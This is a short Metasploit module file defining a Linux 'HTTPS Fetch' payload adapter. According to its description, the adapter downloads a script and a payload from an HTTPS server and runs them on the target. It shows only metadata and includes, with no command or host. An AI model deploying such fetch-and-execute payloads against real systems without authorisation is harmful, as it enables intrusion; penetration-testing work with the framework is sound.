##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::Https
  include Msf::Payload::Adapter::Fetch::LinuxOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'HTTPS Fetch',
        'Description' => 'Fetch and execute a script to determine the host arch and execute a payload from an HTTPS server.',
        'Author' => ['Brendan Watters', 'Spencer McIntyre'],
        'Platform' => 'linux',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_ANY,
        'AdaptedPlatform' => 'linux'
      )
    )
  end
end
